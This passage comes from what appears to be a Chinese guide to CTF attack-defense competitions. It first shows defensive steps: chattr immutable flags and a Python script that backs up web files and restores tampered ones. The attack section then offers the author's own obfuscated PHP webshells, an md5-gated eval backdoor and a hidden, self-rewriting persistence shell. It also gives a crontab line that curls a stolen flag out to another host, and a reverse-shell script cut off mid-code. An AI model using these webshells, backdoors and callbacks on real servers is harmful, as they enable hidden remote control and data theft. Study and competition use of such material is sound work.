class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span><br><span class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span><br><span class="line">各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</span><br><span class="line"></span><br><span class="line">应用举例：</span><br><span class="line"></span><br><span class="line">用chattr命令防止系统中某个关键文件被修改：</span><br><span class="line"><span class="comment"># chattr +i /etc/resolv.conf</span></span><br></pre></td></tr></table></figure><p>12.部署文件监控，如果发现新上传文件或者文件被修改立即恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--</span></span><br><span class="line"><span class="comment"># v demo 0.21 修改了备份的webshell会自己坑自己的情况</span></span><br><span class="line"><span class="comment"># todo: windows下不支持中文目录</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> hash</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</span><br><span class="line">        <span class="keyword">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></span><br><span class="line">七、自动提交</span><br></pre></td></tr></table></figure><h3 id="0x04-攻击技巧"><a href="#0x04-攻击技巧" class="headerlink" title="0x04 攻击技巧"></a>0x04 攻击技巧</h3><p>1.拿到命令执行漏洞后执行crontab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考</span></span><br><span class="line"><span class="comment"># http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></span><br><span class="line">*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d <span class="string">'flag='</span>$(cat /home/web/flag/flag)<span class="string">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span></span><br></pre></td></tr></table></figure><p>2.注意源码中或者备份文件中是否存在mysql等的弱口令</p><p>3.主机发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用httpscan脚本</span></span><br><span class="line">./httpscan.py 172.16.0.0/24 –t 10</span><br><span class="line"><span class="comment"># masscan</span></span><br><span class="line">masscan -p 80 172.16.0.0/24</span><br><span class="line"><span class="comment"># nmap</span></span><br><span class="line">nmap –sn 172.16.0.0/24</span><br></pre></td></tr></table></figure><p>4.常用的特殊webshell</p><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用为<code>?C=phpinfo();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p><p>5.权限维持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'.conifg.php'</span>;</span><br><span class="line">$shell = <span class="string">"&lt;?php echo system("</span>curl <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span><span class="string">"); ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<code>.config.php</code>前面使用一个点，能很好的隐藏文件。<br>想要结束这个进程，除了最暴力的重启apache服务之外，更为优雅的如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">$pid=<span class="number">1234</span>;</span><br><span class="line">@unlink(<span class="string">'.config.php'</span>);</span><br><span class="line">exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先查看进程，查看对应的pid，再执行即可。</p><p>素质低的人则会放置一个md5马，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果素质低的人又很猥琐，像<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="noopener">rootrain</a>这种就是。那就是利用<code>header</code>，最后综合起来就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">$test= <span class="string">'flag'</span>;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p><p>还可以采用反弹shell的方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123; </span><br><span class="line">$path = execute(<span class="string">"which $pr"</span>); </span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123; </span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123; </span><br><span class="line">@exec($cfe,$res); </span><br><span class="line">$res = join(<span class="string">"\n"</span>,$res); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123; </span><br><span class="line">$res = @shell_exec($cfe); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@system($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@passthru($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span>(!@feof($f)) &#123; </span><br><span class="line">$res .= @fread($f,<span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">@pclose($f); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> $res; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123; </span><br><span class="line">@fputs($fp,@base64_decode($text)); </span><br><span class="line">@fclose($fp); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$yourip = <span class="string">"192.168.71.1"</span>; </span><br><span class="line">$yourport = <span class="string">'9999'</span>; </span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span 